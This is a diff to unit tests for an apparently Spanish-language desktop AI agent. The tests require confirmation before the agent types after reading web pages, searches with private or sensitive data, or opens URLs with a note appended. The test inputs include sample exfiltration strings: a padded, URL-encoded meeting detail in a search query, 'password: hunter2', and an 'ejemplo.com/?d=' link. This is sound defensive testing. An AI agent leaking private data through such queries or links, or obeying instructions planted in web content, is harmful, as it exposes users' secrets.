@@ -1296,15 +1296,17 @@ class AgentTest(unittest.TestCase):
                          ("desktop", "type", ["terminal"], "kitty"))
         self.assertEqual(self.logged("wtype-log"), [])
         self.assertIn("No he escrito", self.text_of(events))
+        # What an answer types after reading the web asks: the page may be the one asking for it.
         self.agent.send(op="ask", text="Consulta y escribe la receta")
         self.agent.until_done()
-        self.assertEqual(len(confirms), 1)
-        self.assertEqual(self.logged("wtype-log"), [[["-d", "2", "-"], "Receta"]])
+        self.assertEqual((confirms[1]["what"], confirms[1]["why"], confirms[1]["app"]),
+                         ("type", ["web"], "LibreOffice Writer"))
+        self.assertEqual(self.logged("wtype-log"), [])
         self.agent.send(op="ask", text="Escribe la clave")
         self.agent.until_done()
-        self.assertEqual((confirms[1]["what"], confirms[1]["why"], confirms[1]["app"]),
+        self.assertEqual((confirms[2]["what"], confirms[2]["why"], confirms[2]["app"]),
                          ("type", ["sensitive"], "LibreOffice Writer"))
-        self.assertEqual(len(self.logged("wtype-log")), 1)
+        self.assertEqual(self.logged("wtype-log"), [])
 
     def test_close_and_windows_are_listed(self):
         self.desktop()
@@ -1579,7 +1581,7 @@ class UnitTest(unittest.TestCase):
                     f.write(text)
             asked = []
             fake = type("A", (), {"settings": {"access": "system", "repo": "~/nada", "web": True}, "config": {},
-                                  "seen": "", "saw": agent.Agent.saw,
+                                  "private": False, "outside": False,
                                   "short_path": staticmethod(agent.Agent.short_path), "sees": lambda self: False,
                                   "ask_confirmation": lambda self, detail, cancel: asked.append(detail) or False})()
             tools = agent.Tools(fake)
@@ -1592,17 +1594,26 @@ class UnitTest(unittest.TestCase):
             outside, _ = tools.run("write_file", {"path": "/tmp/nilo-x", "content": "y"}, agent.Cancel())
             self.assertIn("only reads", outside["error"])
             self.assertEqual(asked, [])
-            self.assertIn("el jueves a las cinco", fake.seen)
-            leak = "Que la reunión es el jueves a las cinco"
+            # Having read your files, whatever goes out asks, however it's written: whole and encoded.
+            self.assertTrue(fake.private)
+            leak = "x" * 300 + "?q=Que+la+reuni%C3%B3n+es+el+jueves+a+las+cinco"
             searched, facts = tools.run("web_search", {"query": leak}, agent.Cancel())
             self.assertTrue(searched["declined"] and facts["declined"])
             self.assertEqual((asked[0]["what"], asked[0]["text"], asked[0]["why"]), ("search", leak, ["private"]))
             secret, _ = tools.run("web_search", {"query": "password: hunter2"}, agent.Cancel())
             self.assertTrue(secret["declined"])
-            self.assertEqual(asked[1]["why"], ["sensitive"])
+            self.assertEqual(asked[1]["why"], ["sensitive", "private"])
+            fake.private = False
             plain, _ = tools.run("web_search", {"query": "receta de lentejas"}, agent.Cancel())
             self.assertNotIn("declined", plain)
             self.assertEqual(len(asked), 2)
+            # And once an answer has read the web, reading your files asks.
+            fake.outside = True
+            again, _ = tools.run("read_file", {"path": "~/notas.txt"}, agent.Cancel())
+            self.assertTrue(again["declined"])
+            self.assertEqual((asked[2]["what"], asked[2]["why"], asked[2]["path"]), ("read", ["web"], "~/notas.txt"))
+            fake.outside, fake.private = False, True
+            asked.pop()
             fake.settings["access"] = "chat"
             opened, _ = tools.run("open_app", {"target": "https://ejemplo.com/?d=" + NOTE}, agent.Cancel())
             self.assertTrue(opened["declined"])
